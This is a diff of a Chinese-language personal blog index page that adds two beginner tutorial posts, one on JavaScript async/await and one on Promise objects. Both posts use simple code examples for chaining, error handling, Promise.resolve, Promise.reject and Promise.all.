@@ -120,7 +120,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">361</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">140</span></a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">369</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">145</span></a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -185,18 +185,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">145</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">361</span>
+        <span class="site-state-item-count">369</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -221,6 +221,320 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/08/Async-Await/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/02/08/Async-Await/" class="post-title-link" itemprop="url">Async-Await</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-02-08 00:22:00" itemprop="dateCreated datePublished" datetime="2022-02-08T00:22:00+08:00">2022-02-08</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="Async-Await"><a href="#Async-Await" class="headerlink" title="Async-Await"></a>Async-Await</h1><p>异步编程的最高境界，就是根本不用关心它异步。</p>
+<p>async 函数就是隧道尽头的亮光，很多人认为它是异步操作的终极解决方案。</p>
+<h1 id="async-await-与-promise-的关系"><a href="#async-await-与-promise-的关系" class="headerlink" title="async-await 与 promise 的关系"></a>async-await 与 promise 的关系</h1><p>不存在谁替代谁，因为 async-await 是寄生于 Promise。Generator 的语法糖。</p>
+<p><strong>async</strong> ：声明一个方法是异步的</p>
+<p><strong>await</strong> ：可以认为是 async wait 的简写，等待一个异步方法执行完成。</p>
+<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params">params</span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">demo</span>()</span><br></pre></td></tr></table></figure>
+
+<p>async 函数返回的是一个 Promise 对象</p>
+<p>必须了解的 AsyncFunction <code>console.log(async function(){}.constructor)</code></p>
+<p>在 Chrome 里申明这样一个函数，可以在控制台看到返回的其实就是一个 Promise 对象。</p>
+<p>扩展需要了解的就是 Chrome 现在也支持 AsyncFunction , 可以在 Chrome 控制台测试：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;.<span class="property">constructor</span>)</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">AsyncFunction</span>(<span class="params"></span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h1><ol>
+<li>async 表示这是一个 async 函数，await 只能用在这个函数里面。</li>
+<li>await 表示在这里等待 Promise 对象返回结果后，在继续执行。</li>
+<li>await 后面跟着的应该是一个 Promise 对象（当然，其他返回值也没关系，只是会立即执行，不过那样就没有意义了）</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">123</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">demo</span>();</span><br></pre></td></tr></table></figure>
+
+<h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><p>Promise 虽然一方面解决了 <code>callback</code> 的回调地狱，但是相对的把回调“纵向发展”了，形成了一个回调链。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">wait</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">            <span class="title function_">res</span>(wait)</span><br><span class="line">        &#125;, wait)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调地狱</span></span><br><span class="line"><span class="title function_">sleep</span>(<span class="number">100</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result01</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">sleep</span>(result01 + <span class="number">100</span>);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result02</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">sleep</span>(result02 + <span class="number">100</span>);</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">result03</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result03); <span class="comment">// 300</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改成async/await写法就是</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">// await 是强制把异步变成了同步，这一句代码执行完，才会执行下一句</span></span><br><span class="line">    <span class="keyword">let</span> result01 = <span class="keyword">await</span> <span class="title function_">sleep</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">let</span> result02 = <span class="keyword">await</span> <span class="title function_">sleep</span>(result01 + <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">let</span> result03 = <span class="keyword">await</span> <span class="title function_">sleep</span>(result02 + <span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> result03;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">demo</span>().<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);	<span class="comment">// 300</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h1 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h1><p>既然 <code>.then(...)</code> 不用写了，那么 <code>.catch(...)</code> 也不用写，可以直接用标准的 <code>try catch</code> 语法捕捉错误。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params">params</span>)&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="keyword">await</span> p;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">demo</span>();	<span class="comment">// error</span></span><br></pre></td></tr></table></figure>
+
+<p>这是基本的错误处理，但是当内部出现错一些错误时，和上面Promise有点类似，demo() 函数不会报错，函数需要catch回调捕捉吗，这就是内部错误被‘静默’处理了。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">1000</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">demo</span>(<span class="params">params</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="keyword">await</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">demo</span>().<span class="title function_">catch</span>(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<h1 id="注意你的并行执行和循环"><a href="#注意你的并行执行和循环" class="headerlink" title="注意你的并行执行和循环"></a>注意你的并行执行和循环</h1><p>如果这你想异步发出AJAX请求，使用 await 代码会同步执行，所以 async&#x2F;await 需要谨慎使用。</p>
+<p>await in for 循环：await 的执行上下文必须是 async 函数</p>
+<p>现在有一些 <code>.forEach</code> 或者 <code>.map</code> 的循环里，比如在 <code>.forEach</code> 里使用 await , 这时候的上下文就变成了 Array ,而不是 <code>async function</code> ,就会报错。这时候你就要想到是什么错误。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/28/Promise-%E5%AF%B9%E8%B1%A1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="l1n6yun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="l1n6yun's Blog">
+      <meta itemprop="description" content="chitanda | 互联网 | 前端 | 宅 | 动漫 | 京阿尼">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | l1n6yun's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/01/28/Promise-%E5%AF%B9%E8%B1%A1/" class="post-title-link" itemprop="url">Promise 对象</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-01-28 00:23:00" itemprop="dateCreated datePublished" datetime="2022-01-28T00:23:00+08:00">2022-01-28</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Promise 对象代表了未来将要发生的事件，用来传递异步操作的消息。简单来说就是一个容器，里面保存着某个未来才会结束的事件(通常是一个异步操作的结果)</p>
+</blockquote>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ECMAscript 6 原生提供了 Promise 对象。</p>
+<p>Promise 对象代表了未来将要发生的事件，用来传递异步操作的消息。简单来说就是一个容器，里面保存着某个未来才会结束的事件(通常是一个异步操作的结果)</p>
+<p>Promise 对象的基本语法：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="comment">// 异步处理</span></span><br><span class="line">    <span class="comment">// 处理结束后、调用resolve 或 reject</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol>
+<li><p>对象的状态不受外界影响</p>
+<p>Promise 对象表示一个异步操作，有三种状态</p>
+<ul>
+<li><p>pending: 初始状态</p>
+</li>
+<li><p>fulfilled: 操作成功</p>
+</li>
+<li><p>rejected: 操作失败</p>
+</li>
+</ul>
+</li>
+<li><p>一旦状态改变，就不会再变，状态就凝固了</p>
+</li>
+</ol>
+<p>列如:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> promise = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="keyword">function</span>(<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">    <span class="title function_">resolve</span>(<span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;after resolve&#x27;</span>)</span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">promise.<span class="title function_">catch</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果</span></span><br><span class="line">after resolve</span><br><span class="line">success</span><br><span class="line"><span class="title class_">Promise</span> &#123; &lt;state&gt;: <span class="string">&quot;fulfilled&quot;</span>, &lt;value&gt;: <span class="string">&quot;success&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>resolve</code> 后面的语句其实是可以执行的。那么为什么 <code>reject</code> 的状态信息在下面没有接受到呢？这就是 Promise 对象的状态凝固特点。<code>new</code> 出一个 Promise 对象时，这个对象的起始状态就是 pending 状态，再根据 <code>resolve</code> 或 <code>reject</code> 返回 fulfilled 状态或 rejected 状态。</p>
+<h2 id="传递回调"><a href="#传递回调" class="headerlink" title="传递回调"></a>传递回调</h2><p>Promise 对象可以调用 <code>promise.then()</code> 方法，传递 <code>resolve</code> , <code>reject</code> 方法的回调。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">promise.<span class="title function_">then</span>(onFulfilled, onRejected)</span><br><span class="line">promise.<span class="title function_">then</span>(onFulfilled)		<span class="comment">// 只用于接受 resolve 处理</span></span><br><span class="line">promise.<span class="title function_">then</span>(<span class="literal">null</span>,onFulfilled)	<span class="comment">// 只用于接受 reject 处理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// promise简化了对error的处理</span></span><br><span class="line">promise.<span class="title function_">then</span>(onFulfilled).<span class="title function_">catch</span>(onRejected)</span><br></pre></td></tr></table></figure>
+
+<h2 id="链式调用"><a href="#链式调用" class="headerlink" title="链式调用"></a>链式调用</h2><p>我们来执行一段代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&#x27;reject&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> resultP = p.<span class="title function_">then</span>(<span class="literal">null</span>,<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resultP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果</span></span><br><span class="line"><span class="title class_">Promise</span> &#123; &lt;state&gt;: <span class="string">&quot;pending&quot;</span> &#125;</span><br><span class="line">reject</span><br></pre></td></tr></table></figure>
+
+<p>js 的执行顺序就是这样，同步-&gt;异步-&gt;回调，在同步执行的时候，Promise 对象还处于 pending 的状态，也说明了这个 then 返回的是一个 Promise 对象。</p>
+<p>而且必须在then里面给一个返回值，才能继续调用，否则undefined。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">reject</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> resultP = p.<span class="title function_">then</span>(<span class="literal">null</span>,<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(resultP);</span></span><br><span class="line">resultP.<span class="title function_">then</span>(<span class="function"><span class="params">tmp</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(tmp);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果</span></span><br><span class="line">error</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h2><p>将现有对象转为 Promise 对象的快捷方式。</p>
+<p>传递一个普通的对象：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123;<span class="attr">name</span>:<span class="string">&#x27;l1n6yun&#x27;</span>,<span class="attr">age</span>:<span class="string">&#x27;18&#x27;</span>&#125;);</span><br><span class="line"><span class="comment">// Promise &#123; &lt;state&gt;: &quot;fulfilled&quot;, &lt;value&gt;: &#123; name: &quot;l1n6yun&quot;, age: &quot;18&quot; &#125; &#125;</span></span><br><span class="line"></span><br><span class="line">p1.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果</span></span><br><span class="line"><span class="title class_">Object</span> &#123; <span class="attr">name</span>: <span class="string">&quot;l1n6yun&quot;</span>,<span class="attr">age</span>:<span class="string">&quot;18&quot;</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果是Promise对象呢，直接返回</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">    &#125;,<span class="number">500</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pp = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(p);</span><br><span class="line"></span><br><span class="line">pp.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(pp == p);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果</span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line">success</span><br></pre></td></tr></table></figure>
+
+<h2 id="Promise-reject"><a href="#Promise-reject" class="headerlink" title="Promise.reject()"></a>Promise.reject()</h2><p>快速的获取一个拒绝状态的 Promise 对象。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="number">123</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br><span class="line"></span><br><span class="line">p.<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;catch&#x27;</span>,result);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行结果</span></span><br><span class="line"><span class="title class_">Promise</span> &#123; &lt;rejected&gt; <span class="number">123</span> &#125;</span><br><span class="line"><span class="keyword">catch</span> <span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h2><p><code>Promise.all()</code> 方法用于对多个 Promise 实例包装成一个新的 Promise 实例。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p1 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="number">123</span>);</span><br><span class="line"><span class="keyword">let</span> p2 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> p3 = <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([p1,p2,p3]).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行结果</span></span><br><span class="line"><span class="title class_">Array</span>(<span class="number">3</span>) [ <span class="number">123</span>, <span class="string">&quot;hello&quot;</span>, <span class="string">&quot;success&quot;</span> ]</span><br></pre></td></tr></table></figure>
+
+<p>成功之后就是数组类型，但所有状态都是成功状态才可以返回数组吗。如果其中有一个对象状态为 reject 就返回 reject 的状态值。</p>
